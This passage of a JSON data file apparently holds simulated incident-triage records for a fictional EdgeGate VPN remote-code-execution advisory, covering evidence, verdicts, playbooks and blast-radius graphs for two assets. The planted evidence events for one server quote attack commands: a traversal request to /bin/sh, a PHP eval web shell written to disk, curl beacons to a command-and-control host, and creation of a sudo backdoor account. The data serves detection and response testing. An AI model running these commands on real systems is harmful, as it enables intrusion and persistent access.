          "confidence": 0.98
        },
        {
          "id": "SENT-03",
          "sentence": "Disclosed: October 9, 2026. First observed in the wild: October 4, 2026.",
          "confidence": 0.98
        },
        {
          "id": "SENT-04",
          "sentence": "Vulnerability Class: Pre-Authentication Remote Code Execution and Session Hijack (CWE-287 / CWE-78).",
          "confidence": 0.98
        },
        {
          "id": "SENT-05",
          "sentence": "Attackers exploit crafted HTTP POST requests to /api/v1/auth/session to bypass authentication and execute code as root.",
          "confidence": 0.98
        },
        {
          "id": "SENT-06",
          "sentence": "Following exploitation, attackers commonly plant a web shell at /var/www/html/assets/.sys_cache.php or .sess_key.so.",
          "confidence": 0.98
        },
        {
          "id": "SENT-07",
          "sentence": "Intruders maintain persistent outbound command-and-control beaconing over TLS port 8443 to unusual IP ranges.",
          "confidence": 0.98
        },
        {
          "id": "SENT-08",
          "sentence": "Additionally, attackers create dormant local administrator accounts such as svc_sec_audit or backdoor_adm.",
          "confidence": 0.98
        },
        {
          "id": "SENT-09",
          "sentence": "Patching to version 9.2.4 or higher fixes the flaw. However, patching alone does NOT terminate valid stolen sessions or remove planted web shells.",
          "confidence": 0.98
        },
        {
          "id": "SENT-10",
          "sentence": "Post-patch verification must confirm termination of all active sessions, removal of unauthorized files, and credential rotation.",
          "confidence": 0.98
        }
      ],
      "created_at": "2026-10-09T08:00:00Z"
    },
    "evidence": [],
    "coverage": {
      "asset_id": "ASSET-MERIDIAN-002",
      "overall_coverage": 0.978,
      "sources": [
        {
          "source_type": "web",
          "required_days": 45,
          "available_days": 44,
          "coverage_ratio": 0.978,
          "gaps": [
            "Missing 1 days of historical telemetry (44/45 days retained)"
          ],
          "has_retention_blindspot": true
        },
        {
          "source_type": "endpoint",
          "required_days": 45,
          "available_days": 44,
          "coverage_ratio": 0.978,
          "gaps": [
            "Missing 1 days of historical telemetry (44/45 days retained)"
          ],
          "has_retention_blindspot": true
        },
        {
          "source_type": "auth",
          "required_days": 45,
          "available_days": 44,
          "coverage_ratio": 0.978,
          "gaps": [
            "Missing 1 days of historical telemetry (44/45 days retained)"
          ],
          "has_retention_blindspot": true
        },
        {
          "source_type": "network",
          "required_days": 45,
          "available_days": 43,
          "coverage_ratio": 0.956,
          "gaps": [
            "Missing 2 days of historical telemetry (43/45 days retained)"
          ],
          "has_retention_blindspot": true
        },
        {
          "source_type": "file",
          "required_days": 45,
          "available_days": 45,
          "coverage_ratio": 1.0,
          "gaps": [],
          "has_retention_blindspot": false
        }
      ],
      "adequate": true,
      "blind_spots": [
        "WEB: Only 44 of 45 days available",
        "ENDPOINT: Only 44 of 45 days available",
        "AUTH: Only 44 of 45 days available",
        "NETWORK: Only 43 of 45 days available"
      ],
      "recommendations": [
        "Log coverage is sufficient to assess pre-disclosure exploitation with high confidence."
      ]
    },
    "verdict": {
      "asset_id": "ASSET-MERIDIAN-002",
      "advisory_id": "SIM-2026-0001",
      "state": "No evidence found",
      "confidence": "high",
      "reasons": [
        {
          "text": "No indicators of compromise or anomalous exploit behaviors detected across 97% telemetry coverage over the past 45 days.",
          "evidence_ids": [
            "COV-VERIFIED-meridian-vpn-gw-02"
          ]
        }
      ],
      "coverage_score": 0.978,
      "coverage_report": {
        "asset_id": "ASSET-MERIDIAN-002",
        "overall_coverage": 0.978,
        "sources": [
          {
            "source_type": "web",
            "required_days": 45,
            "available_days": 44,
            "coverage_ratio": 0.978,
            "gaps": [
              "Missing 1 days of historical telemetry (44/45 days retained)"
            ],
            "has_retention_blindspot": true
          },
          {
            "source_type": "endpoint",
            "required_days": 45,
            "available_days": 44,
            "coverage_ratio": 0.978,
            "gaps": [
              "Missing 1 days of historical telemetry (44/45 days retained)"
            ],
            "has_retention_blindspot": true
          },
          {
            "source_type": "auth",
            "required_days": 45,
            "available_days": 44,
            "coverage_ratio": 0.978,
            "gaps": [
              "Missing 1 days of historical telemetry (44/45 days retained)"
            ],
            "has_retention_blindspot": true
          },
          {
            "source_type": "network",
            "required_days": 45,
            "available_days": 43,
            "coverage_ratio": 0.956,
            "gaps": [
              "Missing 2 days of historical telemetry (43/45 days retained)"
            ],
            "has_retention_blindspot": true
          },
          {
            "source_type": "file",
            "required_days": 45,
            "available_days": 45,
            "coverage_ratio": 1.0,
            "gaps": [],
            "has_retention_blindspot": false
          }
        ],
        "adequate": true,
        "blind_spots": [
          "WEB: Only 44 of 45 days available",
          "ENDPOINT: Only 44 of 45 days available",
          "AUTH: Only 44 of 45 days available",
          "NETWORK: Only 43 of 45 days available"
        ],
        "recommendations": [
          "Log coverage is sufficient to assess pre-disclosure exploitation with high confidence."
        ]
      },
      "evaluated_at": "2026-10-18T17:48:03.075878+00:00",
      "verdict_hash": "f3e78e44ea158e2e1f55616477e16e4a66cefdca99fe219542f639a762428ac4"
    },
    "gate": {
      "asset_id": "ASSET-MERIDIAN-002",
      "advisory_id": "SIM-2026-0001",
      "outcome": "Patch now",
      "gate_locked": false,
      "required_roles": [
        "Asset_Owner"
      ],
      "override_applied": false,
      "override_reason": null,
      "override_approver": null,
      "status": "pending",
      "created_at": "2026-10-18T17:48:03.075886+00:00"
    },
    "clock": {
      "asset_id": "ASSET-MERIDIAN-002",
      "advisory_id": "SIM-2026-0001",
      "profile": "CERT-In 12h/1d/3d/5d",
      "target_tier": "high (24h)",
      "start_time": "2026-10-18T17:48:03.113209+00:00",
      "deadline_time": "2026-10-19T17:48:03.113209+00:00",
      "seconds_remaining": 86400,
      "is_paused": false,
      "is_breached": false,
      "pause_reason": null
    },
    "playbook": {
      "id": "PLAYBOOK-ASSET-MERIDIAN-002-CVE-2026-9901",
      "advisory_id": "SIM-2026-0001",
      "asset_id": "ASSET-MERIDIAN-002",
      "steps": [
        {
          "step_id": "STEP-CONT-01",
          "title": "Network Containment / VLAN Isolation",
          "phase": "containment",
          "description": "Isolate meridian-vpn-gw-02 (192.0.2.19) from production network to quarantine VLAN to prevent lateral movement.",
          "owner": "secops-analyst@postern.local",
          "status": "pending",
          "verification_method": "Verify ping loss from internal LAN subnet while preserving access via out-of-band management.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CONT-02",
          "title": "Forensic Evidence Preservation",
          "phase": "containment",
          "description": "Take live memory snapshot and preserve volatile network socket states before host reboot or patching.",
          "owner": "dfir-lead@postern.local",
          "status": "pending",
          "verification_method": "Confirm cryptographic SHA-256 hash generated for memory dump image.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-01",
          "title": "Terminate All Stolen Active Sessions",
          "phase": "cleanup",
          "description": "Flush all authenticated VPN and admin session tokens from memory and local session store (e.g. /var/run/edgegate/sessions).",
          "owner": "sysadmin@postern.local",
          "status": "pending",
          "verification_method": "Query auth daemon session table to confirm 0 active sessions remain.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-02",
          "title": "Remove Unauthorized Web Shells & Implants",
          "phase": "cleanup",
          "description": "Scan and remove /var/www/html/assets/.sys_cache.php and check file integrity of web portal root.",
          "owner": "sysadmin@postern.local",
          "status": "pending",
          "verification_method": "Run file integrity checker to verify directory matches pristine distribution hash.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-03",
          "title": "Rotate Administrator & Service Credentials",
          "phase": "cleanup",
          "description": "Rotate master LDAP/AD bind credentials, local root passwords, and VPN preshared keys.",
          "owner": "iam-admin@postern.local",
          "status": "pending",
          "verification_method": "Check password last-changed timestamp in directory service.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-04",
          "title": "Audit Local Accounts for Dormant Backdoors",
          "phase": "cleanup",
          "description": "Check /etc/passwd and /etc/shadow for unauthorized accounts such as 'svc_sec_audit' or 'backdoor_adm'.",
          "owner": "secops-analyst@postern.local",
          "status": "pending",
          "verification_method": "Verify diff against baseline authorized user manifest.",
          "verified_at": null,
          "verified_by": null
        }
      ]
    },
    "blast_radius": {
      "asset_id": "ASSET-MERIDIAN-002",
      "root_node_id": "meridian-vpn-gw-02",
      "nodes": [
        {
          "id": "meridian-vpn-gw-02",
          "label": "meridian-vpn-gw-02 (Focal Gateway)",
          "type": "host",
          "criticality": "high",
          "compromised": false
        },
        {
          "id": "meridian-dc-ad-01",
          "label": "Domain Controller (Active Directory)",
          "type": "dc",
          "criticality": "critical",
          "compromised": false
        },
        {
          "id": "meridian-db-primary-01",
          "label": "Core Transaction Database (PostgreSQL)",
          "type": "database",
          "criticality": "critical",
          "compromised": false
        },
        {
          "id": "meridian-jump-host-01",
          "label": "Bastion / Jump Host (OpenSSH)",
          "type": "host",
          "criticality": "high",
          "compromised": false
        },
        {
          "id": "meridian-cred-vault",
          "label": "Service Account / Kerberos Tickets",
          "type": "credential",
          "criticality": "high",
          "compromised": false
        },
        {
          "id": "meridian-s3-backup",
          "label": "Cold Cloud Storage Backups",
          "type": "service",
          "criticality": "medium",
          "compromised": false
        }
      ],
      "links": [
        {
          "source": "meridian-vpn-gw-02",
          "target": "meridian-cred-vault",
          "relationship": "shared_secret",
          "risk_level": "medium"
        },
        {
          "source": "meridian-vpn-gw-02",
          "target": "meridian-jump-host-01",
          "relationship": "network_egress",
          "risk_level": "low"
        },
        {
          "source": "meridian-cred-vault",
          "target": "meridian-dc-ad-01",
          "relationship": "admin_access",
          "risk_level": "low"
        },
        {
          "source": "meridian-jump-host-01",
          "target": "meridian-db-primary-01",
          "relationship": "trusts",
          "risk_level": "medium"
        },
        {
          "source": "meridian-dc-ad-01",
          "target": "meridian-s3-backup",
          "relationship": "active_session",
          "risk_level": "medium"
        }
      ],
      "blast_radius_score": 22,
      "summary": "Contained Blast Radius: Normal trust paths present; no active lateral credential exposure detected."
    }
  },
  "ASSET-MERIDIAN-005": {
    "asset": {
      "id": "ASSET-MERIDIAN-005",
      "host_name": "meridian-api-server-01",
      "tenant_id": "meridian-finance",
      "owner": "admin@meridianfinance.in",
      "product": "EdgeGate VPN",
      "version": "9.0.2",
      "internet_facing": false,
      "criticality": "critical",
      "timezone": "Asia/Kolkata",
      "ip_address": "192.0.2.123",
      "exposure_tier": "high",
      "status": "matched",
      "notes": null
    },
    "advisory": {
      "id": "SIM-2026-0001",
      "cve_id": "CVE-2026-9901",
      "title": "EdgeGate VPN Pre-Auth RCE & Session Hijack",
      "vendor": "EdgeGate Networks",
      "product": "EdgeGate VPN",
      "affected_versions": [
        ">=9.0.0",
        "<=9.2.3"
      ],
      "vuln_class": "Pre-Auth Remote Code Execution (CWE-287 / CWE-78)",
      "exploitation_status": "known_exploited",
      "disclosure_date": "2026-10-09T08:00:00Z",
      "first_known_exploitation_date": "2026-10-04T00:00:00Z",
      "vendor_mitigations": [
        "Upgrade to firmware 9.2.4+",
        "Restrict /api/v1/auth/session to management subnet"
      ],
      "cleanup_notes": [
        "Kill all active admin sessions",
        "Scan /var/www/html/assets/ for .sys_cache.php",
        "Review local admin accounts"
      ],
      "indicators": [
        "198.51.100.42",
        "/var/www/html/assets/.sys_cache.php",
        "svc_sec_audit",
        "198.51.100.89"
      ],
      "raw_text": "SECURITY ADVISORY SIM-2026-0001 (CRITICAL)\nProduct: EdgeGate VPN Gateway versions 9.0.0 through 9.2.3.\nDisclosed: October 9, 2026. First observed in the wild: October 4, 2026.\nVulnerability Class: Pre-Authentication Remote Code Execution and Session Hijack (CWE-287 / CWE-78).\nAttackers exploit crafted HTTP POST requests to /api/v1/auth/session to bypass authentication and execute code as root.\nFollowing exploitation, attackers commonly plant a web shell at /var/www/html/assets/.sys_cache.php or .sess_key.so.\nIntruders maintain persistent outbound command-and-control beaconing over TLS port 8443 to unusual IP ranges.\nAdditionally, attackers create dormant local administrator accounts such as svc_sec_audit or backdoor_adm.\nPatching to version 9.2.4 or higher fixes the flaw. However, patching alone does NOT terminate valid stolen sessions or remove planted web shells.\nPost-patch verification must confirm termination of all active sessions, removal of unauthorized files, and credential rotation.",
      "source_sentences": [
        {
          "id": "SENT-01",
          "sentence": "SECURITY ADVISORY SIM-2026-0001 (CRITICAL)",
          "confidence": 0.98
        },
        {
          "id": "SENT-02",
          "sentence": "Product: EdgeGate VPN Gateway versions 9.0.0 through 9.2.3.",
          "confidence": 0.98
        },
        {
          "id": "SENT-03",
          "sentence": "Disclosed: October 9, 2026. First observed in the wild: October 4, 2026.",
          "confidence": 0.98
        },
        {
          "id": "SENT-04",
          "sentence": "Vulnerability Class: Pre-Authentication Remote Code Execution and Session Hijack (CWE-287 / CWE-78).",
          "confidence": 0.98
        },
        {
          "id": "SENT-05",
          "sentence": "Attackers exploit crafted HTTP POST requests to /api/v1/auth/session to bypass authentication and execute code as root.",
          "confidence": 0.98
        },
        {
          "id": "SENT-06",
          "sentence": "Following exploitation, attackers commonly plant a web shell at /var/www/html/assets/.sys_cache.php or .sess_key.so.",
          "confidence": 0.98
        },
        {
          "id": "SENT-07",
          "sentence": "Intruders maintain persistent outbound command-and-control beaconing over TLS port 8443 to unusual IP ranges.",
          "confidence": 0.98
        },
        {
          "id": "SENT-08",
          "sentence": "Additionally, attackers create dormant local administrator accounts such as svc_sec_audit or backdoor_adm.",
          "confidence": 0.98
        },
        {
          "id": "SENT-09",
          "sentence": "Patching to version 9.2.4 or higher fixes the flaw. However, patching alone does NOT terminate valid stolen sessions or remove planted web shells.",
          "confidence": 0.98
        },
        {
          "id": "SENT-10",
          "sentence": "Post-patch verification must confirm termination of all active sessions, removal of unauthorized files, and credential rotation.",
          "confidence": 0.98
        }
      ],
      "created_at": "2026-10-09T08:00:00Z"
    },
    "evidence": [
      {
        "event_id": "EV-PLANTED-meridian-api-server-01-01",
        "asset_id": "ASSET-MERIDIAN-005",
        "tenant_id": "meridian-finance",
        "timestamp": "2026-10-04T03:45:00",
        "source_type": "web",
        "event_action": "crafted_request",
        "signal_class": "access",
        "confidence": "high",
        "details": {
          "event_id": "EV-PLANTED-meridian-api-server-01-01",
          "timestamp": "2026-10-04T03:45:00",
          "tenant_id": "meridian-finance",
          "host_name": "meridian-api-server-01",
          "source_type": "web",
          "event_action": "crafted_request",
          "user_name": "anonymous",
          "process_name": "edgegate_httpd",
          "process_cmdline": "/usr/sbin/edgegate_httpd -D FOREGROUND",
          "file_path": "/api/v1/auth/session",
          "http_method": "POST",
          "url_path": "/api/v1/auth/session?bypass=../../bin/sh",
          "status_code": 200,
          "src_ip": "203.0.113.195",
          "dst_ip": "192.0.2.123",
          "dst_port": 443,
          "network_bytes": 4096
        },
        "content_hash": "5b54bf39d300bc75ba89e45ea4cda2f5731c715b8a8d8f031deda0c8d4189bc5"
      },
      {
        "event_id": "EV-PLANTED-meridian-api-server-01-02",
        "asset_id": "ASSET-MERIDIAN-005",
        "tenant_id": "meridian-finance",
        "timestamp": "2026-10-05T21:40:00",
        "source_type": "file",
        "event_action": "file_write_served_dir",
        "signal_class": "persistence",
        "confidence": "high",
        "details": {
          "event_id": "EV-PLANTED-meridian-api-server-01-02",
          "timestamp": "2026-10-05T21:40:00",
          "tenant_id": "meridian-finance",
          "host_name": "meridian-api-server-01",
          "source_type": "file",
          "event_action": "file_write_served_dir",
          "user_name": "www-data",
          "process_name": "sh",
          "process_cmdline": "/bin/sh -c 'echo <?php eval($_POST[x]); ?> > /var/www/html/assets/.sys_cache.php'",
          "file_path": "/var/www/html/assets/.sys_cache.php",
          "http_method": "N/A",
          "url_path": "N/A",
          "status_code": 0,
          "src_ip": "N/A",
          "dst_ip": "N/A",
          "dst_port": 0,
          "network_bytes": 1024
        },
        "content_hash": "5922f13ed3444a3398da49e6997c4808d9975ef8f57259058a7119e1cb955824"
      },
      {
        "event_id": "EV-PLANTED-meridian-api-server-01-03-0",
        "asset_id": "ASSET-MERIDIAN-005",
        "tenant_id": "meridian-finance",
        "timestamp": "2026-10-08T10:00:00",
        "source_type": "network",
        "event_action": "periodic_egress_c2",
        "signal_class": "outbound_control",
        "confidence": "high",
        "details": {
          "event_id": "EV-PLANTED-meridian-api-server-01-03-0",
          "timestamp": "2026-10-08T10:00:00",
          "tenant_id": "meridian-finance",
          "host_name": "meridian-api-server-01",
          "source_type": "network",
          "event_action": "periodic_egress_c2",
          "user_name": "root",
          "process_name": "curl",
          "process_cmdline": "curl -s -k https://198.51.100.42:8443/checkin",
          "file_path": "N/A",
          "http_method": "CONNECT",
          "url_path": "/checkin",
          "status_code": 200,
          "src_ip": "192.0.2.123",
          "dst_ip": "198.51.100.42",
          "dst_port": 8443,
          "network_bytes": 512
        },
        "content_hash": "b050734bf6ebfa1180ddccc1a32377b436ae5a83795e7fee94a22b3febe320a2"
      },
      {
        "event_id": "EV-PLANTED-meridian-api-server-01-03-1",
        "asset_id": "ASSET-MERIDIAN-005",
        "tenant_id": "meridian-finance",
        "timestamp": "2026-10-08T09:45:00",
        "source_type": "network",
        "event_action": "periodic_egress_c2",
        "signal_class": "outbound_control",
        "confidence": "high",
        "details": {
          "event_id": "EV-PLANTED-meridian-api-server-01-03-1",
          "timestamp": "2026-10-08T09:45:00",
          "tenant_id": "meridian-finance",
          "host_name": "meridian-api-server-01",
          "source_type": "network",
          "event_action": "periodic_egress_c2",
          "user_name": "root",
          "process_name": "curl",
          "process_cmdline": "curl -s -k https://198.51.100.42:8443/checkin",
          "file_path": "N/A",
          "http_method": "CONNECT",
          "url_path": "/checkin",
          "status_code": 200,
          "src_ip": "192.0.2.123",
          "dst_ip": "198.51.100.42",
          "dst_port": 8443,
          "network_bytes": 512
        },
        "content_hash": "e0536a6b7ad4e8d9cb095d3c2a439ed94c22750409707c98f0b4d3c17ae2c1a0"
      },
      {
        "event_id": "EV-PLANTED-meridian-api-server-01-03-2",
        "asset_id": "ASSET-MERIDIAN-005",
        "tenant_id": "meridian-finance",
        "timestamp": "2026-10-08T09:30:00",
        "source_type": "network",
        "event_action": "periodic_egress_c2",
        "signal_class": "outbound_control",
        "confidence": "high",
        "details": {
          "event_id": "EV-PLANTED-meridian-api-server-01-03-2",
          "timestamp": "2026-10-08T09:30:00",
          "tenant_id": "meridian-finance",
          "host_name": "meridian-api-server-01",
          "source_type": "network",
          "event_action": "periodic_egress_c2",
          "user_name": "root",
          "process_name": "curl",
          "process_cmdline": "curl -s -k https://198.51.100.42:8443/checkin",
          "file_path": "N/A",
          "http_method": "CONNECT",
          "url_path": "/checkin",
          "status_code": 200,
          "src_ip": "192.0.2.123",
          "dst_ip": "198.51.100.42",
          "dst_port": 8443,
          "network_bytes": 512
        },
        "content_hash": "a3c0a9349f8977f2cd3d477920fae3428574fbe89e613e471ebc23cdcab9f58f"
      },
      {
        "event_id": "EV-PLANTED-meridian-api-server-01-03-3",
        "asset_id": "ASSET-MERIDIAN-005",
        "tenant_id": "meridian-finance",
        "timestamp": "2026-10-08T09:15:00",
        "source_type": "network",
        "event_action": "periodic_egress_c2",
        "signal_class": "outbound_control",
        "confidence": "high",
        "details": {
          "event_id": "EV-PLANTED-meridian-api-server-01-03-3",
          "timestamp": "2026-10-08T09:15:00",
          "tenant_id": "meridian-finance",
          "host_name": "meridian-api-server-01",
          "source_type": "network",
          "event_action": "periodic_egress_c2",
          "user_name": "root",
          "process_name": "curl",
          "process_cmdline": "curl -s -k https://198.51.100.42:8443/checkin",
          "file_path": "N/A",
          "http_method": "CONNECT",
          "url_path": "/checkin",
          "status_code": 200,
          "src_ip": "192.0.2.123",
          "dst_ip": "198.51.100.42",
          "dst_port": 8443,
          "network_bytes": 512
        },
        "content_hash": "cb7c96d5574c32d6b981a6296a33d3e18234a523172e44e20f7d0177ea609941"
      },
      {
        "event_id": "EV-PLANTED-meridian-api-server-01-03-4",
        "asset_id": "ASSET-MERIDIAN-005",
        "tenant_id": "meridian-finance",
        "timestamp": "2026-10-08T09:00:00",
        "source_type": "network",
        "event_action": "periodic_egress_c2",
        "signal_class": "outbound_control",
        "confidence": "high",
        "details": {
          "event_id": "EV-PLANTED-meridian-api-server-01-03-4",
          "timestamp": "2026-10-08T09:00:00",
          "tenant_id": "meridian-finance",
          "host_name": "meridian-api-server-01",
          "source_type": "network",
          "event_action": "periodic_egress_c2",
          "user_name": "root",
          "process_name": "curl",
          "process_cmdline": "curl -s -k https://198.51.100.42:8443/checkin",
          "file_path": "N/A",
          "http_method": "CONNECT",
          "url_path": "/checkin",
          "status_code": 200,
          "src_ip": "192.0.2.123",
          "dst_ip": "198.51.100.42",
          "dst_port": 8443,
          "network_bytes": 512
        },
        "content_hash": "7e59ad40410a3621aca53b8a147f2f485ff9f3a01be1f8eb47b553ef57cdc518"
      },
      {
        "event_id": "EV-PLANTED-meridian-api-server-01-03-5",
        "asset_id": "ASSET-MERIDIAN-005",
        "tenant_id": "meridian-finance",
        "timestamp": "2026-10-08T08:45:00",
        "source_type": "network",
        "event_action": "periodic_egress_c2",
        "signal_class": "outbound_control",
        "confidence": "high",
        "details": {
          "event_id": "EV-PLANTED-meridian-api-server-01-03-5",
          "timestamp": "2026-10-08T08:45:00",
          "tenant_id": "meridian-finance",
          "host_name": "meridian-api-server-01",
          "source_type": "network",
          "event_action": "periodic_egress_c2",
          "user_name": "root",
          "process_name": "curl",
          "process_cmdline": "curl -s -k https://198.51.100.42:8443/checkin",
          "file_path": "N/A",
          "http_method": "CONNECT",
          "url_path": "/checkin",
          "status_code": 200,
          "src_ip": "192.0.2.123",
          "dst_ip": "198.51.100.42",
          "dst_port": 8443,
          "network_bytes": 512
        },
        "content_hash": "488d562eccc543781c2c641bbfddb8d6bf0ce40a07448202a8e554f010129f2b"
      },
      {
        "event_id": "EV-PLANTED-meridian-api-server-01-04",
        "asset_id": "ASSET-MERIDIAN-005",
        "tenant_id": "meridian-finance",
        "timestamp": "2026-10-10T17:15:00",
        "source_type": "auth",
        "event_action": "user_add_privileged",
        "signal_class": "privilege_change",
        "confidence": "high",
        "details": {
          "event_id": "EV-PLANTED-meridian-api-server-01-04",
          "timestamp": "2026-10-10T17:15:00",
          "tenant_id": "meridian-finance",
          "host_name": "meridian-api-server-01",
          "source_type": "auth",
          "event_action": "user_add_privileged",
          "user_name": "root",
          "process_name": "useradd",
          "process_cmdline": "/usr/sbin/useradd -m -s /bin/bash -G sudo svc_sec_audit",
          "file_path": "/etc/passwd",
          "http_method": "N/A",
          "url_path": "N/A",
          "status_code": 0,
          "src_ip": "N/A",
          "dst_ip": "N/A",
          "dst_port": 0,
          "network_bytes": 0
        },
        "content_hash": "e01083b9a3b45012fd43cd48c1a65edb0ac45bdbd9cf234858cf71ac64e20ecc"
      }
    ],
    "coverage": {
      "asset_id": "ASSET-MERIDIAN-005",
      "overall_coverage": 0.987,
      "sources": [
        {
          "source_type": "web",
          "required_days": 45,
          "available_days": 43,
          "coverage_ratio": 0.956,
          "gaps": [
            "Missing 2 days of historical telemetry (43/45 days retained)"
          ],
          "has_retention_blindspot": true
        },
        {
          "source_type": "endpoint",
          "required_days": 45,
          "available_days": 45,
          "coverage_ratio": 1.0,
          "gaps": [],
          "has_retention_blindspot": false
        },
        {
          "source_type": "auth",
          "required_days": 45,
          "available_days": 45,
          "coverage_ratio": 1.0,
          "gaps": [],
          "has_retention_blindspot": false
        },
        {
          "source_type": "network",
          "required_days": 45,
          "available_days": 45,
          "coverage_ratio": 1.0,
          "gaps": [],
          "has_retention_blindspot": false
        },
        {
          "source_type": "file",
          "required_days": 45,
          "available_days": 44,
          "coverage_ratio": 0.978,
          "gaps": [
            "Missing 1 days of historical telemetry (44/45 days retained)"
          ],
          "has_retention_blindspot": true
        }
      ],
      "adequate": true,
      "blind_spots": [
        "WEB: Only 43 of 45 days available",
        "FILE: Only 44 of 45 days available"
      ],
      "recommendations": [
        "Log coverage is sufficient to assess pre-disclosure exploitation with high confidence."
      ]
    },
    "verdict": {
      "asset_id": "ASSET-MERIDIAN-005",
      "advisory_id": "SIM-2026-0001",
      "state": "Likely compromised",
      "confidence": "high",
      "reasons": [
        {
          "text": "Pre-authentication exploitation request observed on 2026-10-04T03:45:00 targeting /api/v1/auth/session?bypass=../../bin/sh matching known CVE bypass patterns.",
          "evidence_ids": [
            "EV-PLANTED-meridian-api-server-01-01"
          ]
        },
        {
          "text": "Unauthorized web shell written to served web directory at /var/www/html/assets/.sys_cache.php by service account on 2026-10-05T21:40:00.",
          "evidence_ids": [
            "EV-PLANTED-meridian-api-server-01-02"
          ]
        },
        {
          "text": "Periodic TLS command-and-control beaconing identified to non-standard destination 198.51.100.42:8443.",
          "evidence_ids": [
            "EV-PLANTED-meridian-api-server-01-03-0",
            "EV-PLANTED-meridian-api-server-01-03-1",
            "EV-PLANTED-meridian-api-server-01-03-2",
            "EV-PLANTED-meridian-api-server-01-03-3",
            "EV-PLANTED-meridian-api-server-01-03-4",
            "EV-PLANTED-meridian-api-server-01-03-5"
          ]
        },
        {
          "text": "Dormant administrative user created via command line '/usr/sbin/useradd -m -s /bin/bash -G sudo svc_sec_audit' on 2026-10-10T17:15:00 to establish post-patch persistence.",
          "evidence_ids": [
            "EV-PLANTED-meridian-api-server-01-04"
          ]
        }
      ],
      "coverage_score": 0.987,
      "coverage_report": {
        "asset_id": "ASSET-MERIDIAN-005",
        "overall_coverage": 0.987,
        "sources": [
          {
            "source_type": "web",
            "required_days": 45,
            "available_days": 43,
            "coverage_ratio": 0.956,
            "gaps": [
              "Missing 2 days of historical telemetry (43/45 days retained)"
            ],
            "has_retention_blindspot": true
          },
          {
            "source_type": "endpoint",
            "required_days": 45,
            "available_days": 45,
            "coverage_ratio": 1.0,
            "gaps": [],
            "has_retention_blindspot": false
          },
          {
            "source_type": "auth",
            "required_days": 45,
            "available_days": 45,
            "coverage_ratio": 1.0,
            "gaps": [],
            "has_retention_blindspot": false
          },
          {
            "source_type": "network",
            "required_days": 45,
            "available_days": 45,
            "coverage_ratio": 1.0,
            "gaps": [],
            "has_retention_blindspot": false
          },
          {
            "source_type": "file",
            "required_days": 45,
            "available_days": 44,
            "coverage_ratio": 0.978,
            "gaps": [
              "Missing 1 days of historical telemetry (44/45 days retained)"
            ],
            "has_retention_blindspot": true
          }
        ],
        "adequate": true,
        "blind_spots": [
          "WEB: Only 43 of 45 days available",
          "FILE: Only 44 of 45 days available"
        ],
        "recommendations": [
          "Log coverage is sufficient to assess pre-disclosure exploitation with high confidence."
        ]
      },
      "evaluated_at": "2026-10-18T17:48:03.080531+00:00",
      "verdict_hash": "bc7ceaab9877fbce6996cfb733d0feda10b785fb7c33a1f90829a6ffd42e1dc8"
    },
    "gate": {
      "asset_id": "ASSET-MERIDIAN-005",
      "advisory_id": "SIM-2026-0001",
      "outcome": "Contain first then patch",
      "gate_locked": true,
      "required_roles": [
        "Incident_Lead",
        "Security_Approver"
      ],
      "override_applied": false,
      "override_reason": null,
      "override_approver": null,
      "status": "pending",
      "created_at": "2026-10-18T17:48:03.080539+00:00"
    },
    "clock": {
      "asset_id": "ASSET-MERIDIAN-005",
      "advisory_id": "SIM-2026-0001",
      "profile": "CERT-In 12h/1d/3d/5d",
      "target_tier": "high (24h)",
      "start_time": "2026-10-18T17:48:03.113230+00:00",
      "deadline_time": "2026-10-19T17:48:03.113230+00:00",
      "seconds_remaining": 86400,
      "is_paused": false,
      "is_breached": false,
      "pause_reason": null
    },
    "playbook": {
      "id": "PLAYBOOK-ASSET-MERIDIAN-005-CVE-2026-9901",
      "advisory_id": "SIM-2026-0001",
      "asset_id": "ASSET-MERIDIAN-005",
      "steps": [
        {
          "step_id": "STEP-CONT-01",
          "title": "Network Containment / VLAN Isolation",
          "phase": "containment",
          "description": "Isolate meridian-api-server-01 (192.0.2.123) from production network to quarantine VLAN to prevent lateral movement.",
          "owner": "secops-analyst@postern.local",
          "status": "pending",
          "verification_method": "Verify ping loss from internal LAN subnet while preserving access via out-of-band management.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CONT-02",
          "title": "Forensic Evidence Preservation",
          "phase": "containment",
          "description": "Take live memory snapshot and preserve volatile network socket states before host reboot or patching.",
          "owner": "dfir-lead@postern.local",
          "status": "pending",
          "verification_method": "Confirm cryptographic SHA-256 hash generated for memory dump image.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-01",
          "title": "Terminate All Stolen Active Sessions",
          "phase": "cleanup",
          "description": "Flush all authenticated VPN and admin session tokens from memory and local session store (e.g. /var/run/edgegate/sessions).",
          "owner": "sysadmin@postern.local",
          "status": "pending",
          "verification_method": "Query auth daemon session table to confirm 0 active sessions remain.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-02",
          "title": "Remove Unauthorized Web Shells & Implants",
          "phase": "cleanup",
          "description": "Scan and remove /var/www/html/assets/.sys_cache.php and check file integrity of web portal root.",
          "owner": "sysadmin@postern.local",
          "status": "pending",
          "verification_method": "Run file integrity checker to verify directory matches pristine distribution hash.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-03",
          "title": "Rotate Administrator & Service Credentials",
          "phase": "cleanup",
          "description": "Rotate master LDAP/AD bind credentials, local root passwords, and VPN preshared keys.",
          "owner": "iam-admin@postern.local",
          "status": "pending",
          "verification_method": "Check password last-changed timestamp in directory service.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-04",
          "title": "Audit Local Accounts for Dormant Backdoors",
          "phase": "cleanup",
          "description": "Check /etc/passwd and /etc/shadow for unauthorized accounts such as 'svc_sec_audit' or 'backdoor_adm'.",
          "owner": "secops-analyst@postern.local",
          "status": "pending",
          "verification_method": "Verify diff against baseline authorized user manifest.",
          "verified_at": null,
          "verified_by": null
        }
      ]
    },
    "blast_radius": {
      "asset_id": "ASSET-MERIDIAN-005",
      "root_node_id": "meridian-api-server-01",
      "nodes": [
        {
          "id": "meridian-api-server-01",
          "label": "meridian-api-server-01 (Focal Gateway)",
          "type": "host",
          "criticality": "critical",
